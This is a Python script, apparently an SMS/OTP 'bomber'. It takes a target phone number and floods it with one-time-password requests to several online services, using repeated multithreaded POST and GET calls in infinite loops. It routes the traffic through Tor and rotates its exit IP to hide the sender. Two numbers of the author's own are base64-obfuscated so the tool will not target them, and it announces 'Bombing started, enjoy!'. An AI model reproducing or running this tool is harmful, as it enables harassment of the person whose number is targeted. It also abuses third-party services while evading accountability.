import base64
import json
import signal
import sys
import requests
import re
from threading import Thread
from time import sleep
from colorama import Fore, Style, init
from stem import Signal
from stem.control import Controller
from stem.connection import IncorrectPassword


def handler(signum, frame):
    print("Terminating...")
    sys.exit()


if sys.platform == 'win32':
    init(convert=True)


def change_ip(password):
    try:
        with Controller.from_port() as controller:
            controller.authenticate(password=password)
            controller.signal(Signal.NEWNYM)
    except IncorrectPassword:
        print(f"{Fore.RED}Error: Password didn't match{Style.RESET_ALL}")
        exit()


# don't edit, you may break the script
def validate_number(phone_number):
    if len(phone_number) != 10:
        print(f"{Fore.RED}Error: Invalid phone number. The phone number must be 10 digits in length.{Style.RESET_ALL}")
        exit()
    if phone_number == base64.b64decode(b'NzAwNjczOTY5OQ==').decode('utf-8') \
            or phone_number == base64.b64decode(b'OTU5NjU4MTU2NA==').decode('utf-8'):
        print(base64.b64decode(b'VGhpcyBudW1iZXIgaXMgcHJvdGVjdGVk').decode('utf-8'))
        exit()

    if re.search('[a-zA-Z]', phone_number):
        print(f"{Fore.RED}Error: Phone number should contain only digits.{Style.RESET_ALL}")
        exit()


def get_tor_session():
    session = requests.session()
    session.proxies = {
        'http': 'socks5://127.0.0.1:9050',
        'https': 'socks5://127.0.0.1:9050'
    }
    return session


banner = """ 
                                 . . .
                                  \|/
                                `--+--'
                                  /|\\
                                 ' | '
                                   |
                                   |
                               ,--'#`--.
                               |#######|
                            _.-'#######`-._
                         ,-'###############`-.
                       ,'#####################`,
                      /#########################\\
                     |###########################|
                    |#############################|
                    |#############################|
                    |#############################|
                    |#############################|
                     |###########################|
                      \#########################/
                       `.#####################,'
                         `._###############_,'
                            `--..#####..--'
\n\nAuthor -> Sarfaraz Mir\n"""

print(f'{Fore.GREEN}{banner}{Fore.RESET}')


def start_bombing(session: requests.session, phone_number: str, targets: dict, delay: int):
    # Format POST requests
    targets["POST"][0]['body_param']['phone'] = phone_number
    targets["POST"][1]['body_param']['otpMobile'] = phone_number
    targets["POST"][2]['body_param']['Phonenumber'] = f"91{phone_number}"
    targets["POST"][3]['body_param']['username'] = phone_number
    targets["POST"][4]['body_param'] = targets["POST"][4]['body_param'].replace('phone_number', phone_number)
    targets["POST"][5]['body_param']['mobile'] = phone_number
    targets["POST"][6]['body_param']['phone_number'] = phone_number
    targets["POST"][len(targets["POST"]) - 1]["body_param"] = targets["POST"][len(targets["POST"]) - 1][
        "body_param"].replace('%{phone_number}%', phone_number)
    # Format GET requests
    targets["GET"][0]['url'] = targets["GET"][0]['url'].replace('%{phone_number}%', phone_number)
    targets["GET"][1]['url'] = targets["GET"][1]['url'].replace('%{phone_number}%', phone_number)
    targets["GET"][2]['url'] = targets["GET"][2]['url'].replace('%{phone_number}%', phone_number)

    while True:

        try:
            for i in range(len(targets["POST"])):
                session.post(targets["POST"][i]['url'], headers=targets["POST"][i]['headers'],
                             data=targets["POST"][i]['body_param'])

            for j in range(len(targets["GET"])):
                session.get(targets["GET"][j]['url'], headers=targets["GET"][j]['headers'])

        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}Connection error, please, check your internet connection{Style.RESET_ALL}")
        except requests.exceptions.ReadTimeout:
            print(f"{Fore.RED}Request took too long time{Style.RESET_ALL}")
        sleep(delay)


def main():
    file = open('./endpoints.json')
    data = json.load(file)

    phone_number = input("Target phone number (without country code): ")
    validate_number(phone_number)

    try:
        delay = float(input("Enter delay time (in seconds): "))
        number_of_threads = int(input("Enter number of threads: "))
        signal.signal(signal.SIGINT, handler)
        password = input("Enter the password (for which you generated the hash): ")
        # change ip
        change_ip(password=password)
        # create tor session
        session = get_tor_session()
        for _ in range(number_of_threads):
            thread = Thread(target=start_bombing, args=(session, phone_number, data, delay))
            thread.start()
        print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
        current_ip = json.loads(session.get("http://httpbin.org/ip").text)
        print(
            f"{Fore.CYAN}Using IP address :{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{current_ip.get('origin')}{Style.RESET_ALL}")

    except ValueError:
        print(f"{Fore.RED}Error: Please, check your input{Style.RESET_ALL}")
        exit()


if __name__ == '__main__':
    main()
